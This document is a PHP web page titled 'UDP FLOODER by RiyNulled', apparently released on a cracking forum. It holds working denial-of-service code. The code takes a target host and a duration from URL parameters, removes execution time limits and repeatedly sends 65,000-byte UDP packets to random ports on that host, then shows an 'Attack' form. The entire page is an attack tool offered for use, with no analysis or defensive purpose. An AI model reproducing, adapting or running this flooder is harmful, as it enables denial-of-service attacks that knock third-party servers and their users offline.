<!DOCTYPE html>
<!--
Developed revision by RiyNulled. 
Released: 11/9/2020
-->
<html lang="en">
	<head>
		<title> UDP FLOODER by RiyNulled </title>
	<style>
	body {
		background-color: black;
		color: #00FF00;
		letter-spacing: 3px; word-spacing: 5px;
		font-family: Courier New, Courier, monospace;
	}
	input{
		background-color: #00FF00; margin:15px;
	}
	#container{
		background-color: rgba(0,0,0,.75);
		border-width: 3px;
		border-style: outset;
		border-color: rgba(230,40,40,1);
		border-radius: 7.5px;
		width: 500px;
		height: 300px;
	}
	.attackbtn{
	    border: 2px rgba(0,0,0,.56) outset;
	    border-radius: 7.5px;
	    font-family: New Courier, Courier, monopace;
	    font-weight: bolder;
	    font-size: 1.6em;
	    padding:12px;
	    margin:10px;
	}
	</style>
</head>
<body>
<center>
      <h2>UDP Flood Script</h2>
    <img src="https://www.nulled.to/uploads/profile/photo-1471297.png" alt="RiyNulled" />
    <br />
<?php
//UDP
if(isset($_GET['host'])&&isset($_GET['time'])){
    $packets = 0;
    ignore_user_abort(TRUE);
    set_time_limit(0);
    $exec_time = $_GET['time'];
    $time = time();
    $max_time = $time+$exec_time;
    $host = $_GET['host'];
		for($i=0;$i<65000;$i++){
			$out .= 'X';
			}	
		while(1){
			$packets++;
			if(time() > $max_time){
				break;
				}
			$rand = rand(1,65000);
			$fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
			
		if($fp){
			fwrite($fp, $out);
			fclose($fp);
			}
		}
    echo "
    <h4>Attack Completed with $packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second</h4>
    \n";
    echo '
  <form action="'.$surl.'" method=GET>
     <input type="hidden" name="act" value="phptools">
        Host: <input type="text" name="host"><br/>
        Time: <input type="text" name="time"><br/>
     <input class="attackbtn" type="submit" value="Attack">
</form>';
}else{ 
    echo '
        <form action="" method="GET">
             <input type="hidden" name="act" value="phptools">
          Host: <input type="text" name="host" value=><br/>
          Time: <input type="text" name="time" value=><br/>
    <input class="attackbtn" type="submit" value="Attack">
</form>';
}
?>
</section>
</center>
</body>
</html>